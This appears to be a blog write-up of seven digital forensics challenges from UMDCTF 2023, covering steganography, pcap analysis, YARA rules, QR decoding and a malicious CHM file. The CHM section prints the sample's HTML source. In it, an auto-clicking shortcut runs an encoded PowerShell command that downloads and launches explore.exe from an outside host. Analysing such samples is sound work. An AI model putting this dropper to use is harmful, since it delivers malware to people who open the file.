---
title: "UMDCTF 2023 | Digital Forensics"
date: "2023-05-17"
excerpt: "Writeup 7/8 digital forensics challs in UMDCTF 2023."
---

![](/images/writeups-forensics-umdctf/featured.png)
## Information

UMDCTF 2023 starts at 5:00 AM on April 29, 2023, and ends at 5:00 AM on May 1, 2023 (which is not at all suitable for someone like me who loves to sleep in).
The challenges in this competition revolve around Pokemon.

## Ranking

Our team ranked **17th/745** teams with 12,799 points. [Detail of scoreboard here](https://ctftime.org/event/1949)
 
![](/images/writeups-forensics-umdctf/image-1.png)

It's a bit disappointing that during the competition, I couldn't fully solve the Forensics challenges. By around 5 AM, when the competition ended, I was too exhausted to continue thinking.

![](/images/writeups-forensics-umdctf/image-2.png)

In this writeup, I will provide solutions for the challenges in ascending order based on their increasing point values.

## Malware Chall Disclaimer

![](/images/writeups-forensics-umdctf/image-3.png)

This challenge provided hint to the `Doctor Hate Him` challenge, and I'll discuss that later. Here, they have given the flag.

**UMDCTF{i_understand_that_malware_chall_is_sus}**

## Mirror Unknown

![](/images/writeups-forensics-umdctf/image-4.png)

Here we have received a picture (.png file).

![](/images/writeups-forensics-umdctf/image-5.png)
Using Google Images, we found a cipher alphabet chart.

![](/images/writeups-forensics-umdctf/image-6.png)

Then we put the words obtained into the format of the flag: `UMDCTF{}` and add the note: _Ancient civilizations didn't believe in whitespace or lowercase_

**UMDCTF{SINJOHRUINS}**

## No. 352

![](/images/writeups-forensics-umdctf/image-7.png)

![hide-n-seek.jpg](hide-n-seek.jpg)

Here, there is a mention of password 1 and password 2, which made me think of the steghide tool (pay attention to password 1, which is the name of Pokemon number 352 - written in lowercase).

password 1: `kecleon`

```php
┌──(kali㉿Spid3r)-[~/Downloads]
└─$ steghide extract -sf hide-n-seek.jpg
Enter passphrase:
wrote extracted data to "kecleon.jpg".
```

and password 2: `timetofindwhatkecleonishiding` (In the description of the challenge...)

```php
┌──(kali㉿Spid3r)-[~/Downloads]
└─$ steghide extract -sf kecleon.jpg
Enter passphrase:
wrote extracted data to "flag.txt".
```

**UMDCTF{KECLE0NNNNN}**

## Fire Type Pokemon Only

![](/images/writeups-forensics-umdctf/image-8.png)

In this challenge, we receive a pcapng file. Use Wireshark to read the data.

I have checked both `strings` and filtered the captured data, but I haven't found anything other than the files retrieved from `FTP`.

![](/images/writeups-forensics-umdctf/image-9.png)

Based on the header of the `secret` file, we can determine that it is a zip file (the remaining files also have the correct format).

![](/images/writeups-forensics-umdctf/image-10.png)

And this zip file requires us to enter a password... to extract a file named `wisdom.mp4`.

![](/images/writeups-forensics-umdctf/image-11.png)

Upon searching for 'pass' in that pcapng file, we found the actual password for this file..

![](/images/writeups-forensics-umdctf/image-12.png)

![](/images/writeups-forensics-umdctf/image-13.png)

## YARA Trainer Gym

![](/images/writeups-forensics-umdctf/image-14.png)

This is quite an interesting challenge that I had the opportunity to explore :))). The challenge provides us with a website to test: https://yara-trainer-gym.chall.lol

```php
import "elf"
import "math"

rule rule1 {
    condition:
        uint32(0) == 0x464c457f
}

rule rule2 {
    strings:
        $rocket1 = "jessie"
        $rocket2 = "james"
        $rocket3 = "meowth"

    condition:
        all of ($rocket*)
}

rule rule3 {
    meta:
        description = "Number of sections in a binary"
     condition:
        elf.number_of_sections == 40
}

rule rule4 {
    strings:
        $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65}
        $hex2 = {5445414d524f434b4554}
        $hex3 = {696d20736f207469726564}
        $hex4 = {736c656570792074696d65}

    condition:
        ($hex1 and $hex2) or ($hex3 and $hex4)
}

rule rule5 {
    condition:
        math.entropy(0, filesize) >= 6
}

rule rule6 {
    strings:
        $xor = "aqvkpjmdofazwf{lqjm1310<" xor
    condition:
        $xor
}

rule rule7 {
    condition:
        for any section in elf.sections : (section.name == "poophaha")
}

rule rule8 {
    condition:
        filesize < 2MB and filesize > 1MB
}
```

Basically, here we have to create a file and upload it to the website (satisfying all 8 rules) in order to obtain the flag.

I approached it by dividing the file into two separate smaller files (each file satisfying a specific set of rules) to avoid complexity during creation.

The first file will satisfy rules 1-4 and 6-7. The second file will satisfy rules 5 and 8 (since generating entropy and file size simultaneously with creating the attributes mentioned above can be a bit challenging).

### First file

![](/images/writeups-forensics-umdctf/image-15.png)

> first rule: 

`uint32(0) == 0x464c457f`

This checks whether the first 32 bits (offset 0) have the value 0x464c457f (indicating whether the file is in the ELF format or not)

To achieve this, it's quite simple. Just add the value 7f 45 4c 46 corresponding to ELF to the file header.

> second rule:

```php
    strings:
        $rocket1 = "jessie"
        $rocket2 = "james"
        $rocket3 = "meowth"

    condition:
        all of ($rocket*)
```

Rule 2 requires the file to contain the strings: `jessie`, `james`, and `meowth`.

--> Convert them to hexadecimal and insert them into the file:
`6a 65 73 73 69 65 6a 61 6d 65 73 6d 65 6f 77 74 68`

> third rule: 

```php
    meta:
        description = "Number of sections in a binary"
     condition:
        elf.number_of_sections == 40
```

This rule checks if the number of sections in the file is exactly 40. I decided to create a file from C to have multiple initial sections.

```php
┌──(root㉿Spid3r-msi)-[/home/spid3r]
└─# echo "int main(){return 0;}" > main.c

┌──(root㉿Spid3r-msi)-[/home/spid3r]
└─# gcc -o main main.c
```

Check the number of sections in the newly created `main` file using the command:

```php
┌──(root㉿Spid3r-msi)-[/home/spid3r]
└─# objdump -h main
```

Then add the sections to the `main` file using the command (each time adding one section, continuously repeating until the `main` file has 40 sections).

```php
┌──(root㉿Spid3r-msi)-[/home/spid3r]
└─# objcopy --add-section .mysection=data.txt main
```

> fourth rule

```php
    strings:
        $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65}
        $hex2 = {5445414d524f434b4554}
        $hex3 = {696d20736f207469726564}
        $hex4 = {736c656570792074696d65}

    condition:
        ($hex1 and $hex2) or ($hex3 and $hex4)
```
We can choose either hex1 and hex2 or hex3 and hex4 as pairs to insert into the file.

> sixth rule

```php
    strings:
        $xor = "aqvkpjmdofazwf{lqjm1310<" xor
    condition:
        $xor
```

Add the string `aqvkpjmdofazwf{lqjm1310<` to complete the process: `61 71 76 6b 70 6a 6d 64 6f 66 61 7a 77 66 7b 6c 71 6a 6d 31 33 31 30 3c`.

> seventh rule

```php
    condition:
        for any section in elf.sections : (section.name == "poophaha")
```

We need a section named `poophaha` (Please note that with the 40 sections created earlier, one of them should be named `poophaha`)

```php
┌──(root㉿Spid3r-msi)-[/home/spid3r]
└─# objcopy --add-section .poophaha=data.txt main
```

### Second file

![](/images/writeups-forensics-umdctf/image-16.png)

For the remaining part, since rules 5 and 8 go together, I will create a new file and then merge the two files together.

```php
rule rule5 {
    condition:
        math.entropy(0, filesize) >= 6
}

rule rule8 {
    condition:
        filesize < 2MB and filesize > 1MB
}
```
Rule 5 requires the entropy of the file to be greater than or equal to 6, while Rule 8 specifies that the file size must be greater than 1MB and less than 2MB.

After creating the first file, its entropy is quite low (less than 1 dot), so I need to create a new file with a higher entropy to compensate.

To achieve an entropy of greater than or equal to 6 (which is quite challenging with files generated from my processes as they often contain repeated bytes), I will create a new file 

```php
┌──(root㉿Spid3r-msi)-[/home/spid3r]
└─# openssl rand -out random.bin 2000000
```

`2000000` here represents the size of the file after creation. I chose this number to comply with Rule 8, and the entropy of the file random.bin generated is very high :)

Next, I will combine these two files together. To make it easier with a large number of bytes, I will use CyberChef.

[hex of file](/images/writeups-forensics-umdctf/File/hex.txt) và [file after creation](/images/writeups-forensics-umdctf/File/download.elf)

**UMDCTF{Y0ur3_4_r34l_y4r4_m4573r!}**

- Also, in this challenge it is possible to increase entropy using a zip file. The algorithm it uses is suitable for pushing up the entropy level, which corresponds to a higher degree of randomness between bytes.

![](/images/writeups-forensics-umdctf/image-17.png)

## Telekinetic Warfare

![](/images/writeups-forensics-umdctf/image-18.png)

In this challenge, we obtained a GIF file where each frame of the GIF represents a QR code. I wrote a script to separate the QR codes and decode them simultaneously.

```py
import os
import glob
from PIL import Image
from pyzbar.pyzbar import decode

# Replace 'path/to/folder' with the actual path to the folder containing the QR codes
folder_path = 'qrcodes/'
output_file = 'qr_codes.txt'

# Create a list of all the image files in the folder
image_files = glob.glob(os.path.join(folder_path, '*.jpg'))

# Open the output file for writing
with open(output_file, 'w') as f:
    # Loop over each image file in the folder
    for image_file in image_files:
        # Open the image and decode the QR code
        image = Image.open(image_file)
        qr_code = decode(image)

        # If a QR code was detected, write the URL to the output file
        if qr_code:
            url = qr_code[0].data.decode()
            f.write(url + '\n')
```

After running the script, we obtained a bunch of base64 strings, which were then converted into a PDF file. You can view the decoded flag in the [decode flag](/images/writeups-forensics-umdctf/File/decode.pdf).

**UMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}**

## Doctors hate him!!

![](/images/writeups-forensics-umdctf/image-19.png)

Based on the `Malware Chall Disclaimer` challenge, we can infer that this challenge is related to malware (perhaps reverse malware?). **little timmy** and i spent the whole night reversing the file that we suspected to be malicious, and the ending was truly unforgettable.

In this challenge, I received a `chm` file. According to my research, it is a Compiled HTML Help file. I tried opening it with Microsoft Help, but didn't find much... (except for a button that didn't do anything).

![](/images/writeups-forensics-umdctf/image-20.png)

Based on this button, I think it might have originally been a web page...

I used the [HelpSmith](http://www.create-chm.com/chm-help-compiler/) tool and obtained the following zip file.

![](/images/writeups-forensics-umdctf/image-21.png)

Yes, it does contain a real web page... now it's more accurate.

![](/images/writeups-forensics-umdctf/image-23.png)

In the source code of the web page, there is a base64-encoded string: `VU1EQ1RGezE5OTdfY2FsbGVkXw==`.

![](/images/writeups-forensics-umdctf/image-22.png)

--> `UMDCTF{1997_called_`

```php
<PARAM name="Item1" value=',cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA'>
<body>
    <!--VU1EQ1RGezE5OTdfY2FsbGVkXw==--> 
    <OBJECT id=shortcut classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"
        width=1 height=1>
        <PARAM name="Command" value="ShortCut">
        <PARAM name="Button" value="Bitmap::shortcut">
        <PARAM name="Item1" value=',cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA'>
        <PARAM name="Item2" value="273,1,1">
    </OBJECT>
    <SCRIPT> shortcut.Click(); </SCRIPT>
    <div class="container">
        <div class="text"> <strong>
                <h1>DOCTORS HATE HIM!!</h1>
            </strong>
            <p>Do you suffer from low energy, fatigue, and a general lack of motivation? Did your Pokemon leave you for
                a better trainer? Rocket Corp's Master Ball Serum can help! Our all-natural formula boosts your energy
                levels and helps you feel like a young trainer ready to take on the world again!</p><button>Find out
                more!</button>
        </div>
        <div class="image"> <img src="depressed_pokemon_trainer.png" alt="Pikachu"> </div>
    </div>
</body>
</html>
$env:WEB_REQUEST -Uri http://dns-server:6969/explorer.exe -OutFile explorer.exe; Start-Process explorer.exe
```

and

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7AA==
```
Decoding the above base64 string yields `Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe;`

Afterwards, I found another segment. 
```
SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA
```
Decode base64: 
`Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'`

`gurl_jnag_gurve` looks quite similar to a flag :)), I used ChatGPT and found out it's ROT13 encoded :))), guessing until death!!!

![](/images/writeups-forensics-umdctf/image-24.png)

--> `they_want_their`

Here comes the **one wrong step, one mile astray** moment. From those code snippets and the mentioned command, I only interpreted the PowerShell command executing `explore.exe` in connection with the challenge name `Malware Chall Disclaimer`. As a result, I misunderstood that I had to dive into researching that malware to trace it down :)), wasting two hours trying to trace and reverse-engineer that `explore.exe` while also attempting to decipher it before reaching the solution.

![](/images/writeups-forensics-umdctf/image.png)

I should have checked the website itself to see if there was anything significant.

![](/images/writeups-forensics-umdctf/image-25.png)

Thank goodness! If I hadn't discovered this by accident before the competition was over, I might have given up on forensics altogether.

![](/images/writeups-forensics-umdctf/image-26.png)

**UMDCTF{1997_called_they_want_their_malware_back_bozo}**

## Conclusion

In this competition, I think the forensics challenges were not too difficult overall (even the newbie-level could be accessed by around 7 out of 8 tasks). However, some tasks were overly reliant on guessing, which made it a bit frustrating for forensic enthusiasts.

Thanks to `Hwi#9932` for helping me identify some misconceptions in the `Telekinetic Warfare` challenge and to everyone in `BKSEC` for constantly encouraging me to improve my skills in forensic challenges digital.